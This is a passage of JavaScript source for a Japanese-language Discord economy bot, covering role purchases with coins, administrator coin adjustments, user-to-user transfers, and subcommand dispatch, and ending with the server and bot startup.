            .addFields({ name: 'あなたの残高', value: `**${newRobberBalance.toLocaleString()}** コイン`, inline: true })
            .setTimestamp();
    }

    await interaction.reply({ embeds: [resultEmbed] });
}

async function handleRoleAdd(interaction, userId, currentBalance) {
    
    if (!interaction.guild.members.me.permissions.has(PermissionsBitField.Flags.ManageRoles)) {
        return interaction.reply({ 
            embeds: [errorEmbed('権限不足', 'ボットにロールを管理する権限がありません。管理者にご確認ください。')], 
            ephemeral: true 
        });
    }

    if (currentBalance < ROLE_ADD_COST) {
        return interaction.reply({ 
            embeds: [errorEmbed('コイン不足', `ロール作成には **${ROLE_ADD_COST.toLocaleString()}** コイン必要です。`)], 
            ephemeral: true 
        });
    }

    const roleName = interaction.options.getString('name');
    let roleColor = interaction.options.getString('color') || 'DEFAULT';

    if (roleColor !== 'DEFAULT' && !/^#?[0-9A-F]{6}$/i.test(roleColor)) {
        return interaction.reply({ 
            embeds: [errorEmbed('不正な色コード', '色の指定は有効な16進数カラーコード（例: FF0000 または #FF0000）である必要があります。')], 
            ephemeral: true 
        });
    }
    if (roleColor !== 'DEFAULT' && !roleColor.startsWith('#')) {
        roleColor = `#${roleColor}`;
    }

    try {
        await interaction.deferReply();

        const newRole = await interaction.guild.roles.create({
            name: roleName,
            color: roleColor,
            permissions: [],
            reason: `${interaction.user.tag} による ${ROLE_ADD_COST} コインでのロール購入`,
        });

        await interaction.member.roles.add(newRole);

        const newBalance = currentBalance - ROLE_ADD_COST;
        updateBalance(userId, newBalance);

        const successEmbed = new EmbedBuilder()
            .setColor(0x00FF00)
            .setTitle('🎉 ロール購入完了')
            .setDescription(`ロール **${roleName}** を **${ROLE_ADD_COST.toLocaleString()}** コインで購入し、付与しました。`)
            .addFields({ name: '現在の残高', value: `**${newBalance.toLocaleString()}** コイン`, inline: true })
            .setTimestamp();

        await interaction.editReply({
            embeds: [successEmbed]
        });

    } catch (error) {
        console.error('ロール作成エラー:', error);
        await interaction.editReply({ 
            embeds: [errorEmbed('処理失敗', 'ロールの作成または付与に失敗しました。ボットの権限設定（ロールがボットより上位でないかなど）を確認してください。')] 
        });
    }
}

async function handleAdminMoney(interaction, isAdd) {
    const targetUser = interaction.options.getUser('user');
    const targetRole = interaction.options.getRole('role');
    const amount = interaction.options.getInteger('money');
    const action = isAdd ? '追加' : '削減';
    const color = isAdd ? 0x00FF00 : 0xFF0000;
    
    const inputErrorEmbed = (description) => new EmbedBuilder().setColor(0xFF8C00).setTitle('⚠️ 入力エラー').setDescription(description).setTimestamp();

    if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
        return interaction.reply({ embeds: [errorEmbed('権限エラー', 'このコマンドは管理者のみ実行できます。')], ephemeral: true });
    }
    
    if (!targetUser && !targetRole) {
        return interaction.reply({ embeds: [inputErrorEmbed('ユーザーまたはロールのいずれか一つを指定してください。')], ephemeral: true });
    }
    if (targetUser && targetRole) {
        return interaction.reply({ embeds: [inputErrorEmbed('ユーザーとロールを同時に指定することはできません。どちらか一つに絞ってください。')], ephemeral: true });
    }

    await interaction.deferReply({ ephemeral: true });

    let affectedCount = 0;
    let targetDescription;

    if (targetUser) {
        const targetBalance = getBalance(targetUser.id);
        const newBalance = isAdd ? targetBalance + amount : Math.max(0, targetBalance - amount);
        updateBalance(targetUser.id, newBalance);
        affectedCount = 1;
        targetDescription = targetUser.username;
    } 
    
    if (targetRole) {
        try {
            const members = await interaction.guild.members.fetch();
            const usersToUpdate = members.filter(member => member.roles.cache.has(targetRole.id) && !member.user.bot);

            usersToUpdate.forEach(member => {
                const currentBalance = getBalance(member.user.id);
                const newBalance = isAdd ? currentBalance + amount : Math.max(0, currentBalance - amount);
                updateBalance(member.user.id, newBalance);
                affectedCount++;
            });
            targetDescription = `${targetRole.name} ロールのメンバー`;

        } catch (error) {
            console.error('ロールメンバーの取得エラー:', error);
            return interaction.editReply({ embeds: [errorEmbed('ロールメンバーの取得エラー', 'ロールメンバーの取得中にエラーが発生しました。')] });
        }
    }

    if (affectedCount === 0 && targetRole) {
        const warningEmbed = new EmbedBuilder()
            .setColor(0xFFFF00)
            .setTitle('⚠️ 操作スキップ')
            .setDescription(`**${targetRole.name}** ロールには有効なメンバーが見つからなかったため、操作は実行されませんでした。`)
            .setTimestamp();
        return interaction.editReply({ 
            embeds: [warningEmbed],
            ephemeral: true
        });
    }

    const successEmbed = new EmbedBuilder()
        .setColor(color)
        .setTitle(`✅ 管理者操作完了 (${action})`)
        .setDescription(`${targetDescription} (${affectedCount}名) の残高に対して操作を行いました。`)
        .addFields({ 
            name: `${action}された金額`, 
            value: `**${amount.toLocaleString()}** コイン`, 
            inline: true 
        })
        .setTimestamp();

    await interaction.editReply({ embeds: [successEmbed] });
}

async function handleGive(interaction, userId, currentBalance) {
    const targetUser = interaction.options.getUser('user');
    const amount = interaction.options.getInteger('money');

    if (targetUser.id === userId) {
        return interaction.reply({ embeds: [errorEmbed('送金失敗', '自分自身に送金することはできません。')], ephemeral: true });
    }
    if (targetUser.bot) {
        return interaction.reply({ embeds: [errorEmbed('送金失敗', 'ボットに送金することはできません。')], ephemeral: true });
    }

    if (currentBalance < amount) {
        return interaction.reply({ 
            embeds: [errorEmbed('送金失敗', `送金に必要な **${amount.toLocaleString()}** コインが足りません。`)
                .addFields({ name: '現在の残高', value: `${currentBalance.toLocaleString()} コイン`, inline: true })], 
            ephemeral: true 
        });
    }

    const targetBalance = getBalance(targetUser.id);
    
    const newSenderBalance = currentBalance - amount;
    const newReceiverBalance = targetBalance + amount;

    updateBalance(userId, newSenderBalance);
    updateBalance(targetUser.id, newReceiverBalance);

    const embed = new EmbedBuilder()
        .setColor(0x00FF00)
        .setTitle('💰 コイン送金完了')
        .setDescription(`**${amount.toLocaleString()}** コインを ${targetUser.username} に送金しました。`)
        .addFields(
            { name: 'あなたの残高 (送金後)', value: `${newSenderBalance.toLocaleString()} コイン`, inline: true },
            { name: `${targetUser.username}の残高 (受領後)`, value: `${newReceiverBalance.toLocaleString()} コイン`, inline: true }
        )
        .setTimestamp();

    await interaction.reply({ embeds: [embed] });
}

async function handleEconomy(interaction, subcommand, userId, currentBalance) {
    switch (subcommand) {
        case 'work':
            await handleWork(interaction, userId, currentBalance);
            break;
        case 'rob':
            await handleRob(interaction, userId, currentBalance);
            break;
        case 'balance':
            const balanceEmbed = new EmbedBuilder()
                .setColor(0x00BFFF)
                .setTitle('💸 現在の残高')
                .setDescription(`あなたの現在の残高は以下の通りです。`)
                .addFields({ 
                    name: '残高', 
                    value: `**${currentBalance.toLocaleString()}** コイン`, 
                    inline: true 
                })
                .setTimestamp();

            await interaction.reply({ 
                embeds: [balanceEmbed],
                ephemeral: true
            });
            break;
        case 'role-add':
            await handleRoleAdd(interaction, userId, currentBalance);
            break;
        case 'add':
            await handleAdminMoney(interaction, true);
            break;
        case 'remove':
            await handleAdminMoney(interaction, false);
            break;
        case 'give':
            await handleGive(interaction, userId, currentBalance);
            break;
    }
}

// --- ボットとサーバーの起動 ---

// Expressサーバーを起動
app.listen(PORT, () => {
    console.log(`Webサーバーがポート ${PORT} で起動しました。`);
});

// Discordクライアントにログイン
client.login(TOKEN);

client.on('error', err => {
    console.error('Discord Client Error:', err);
});
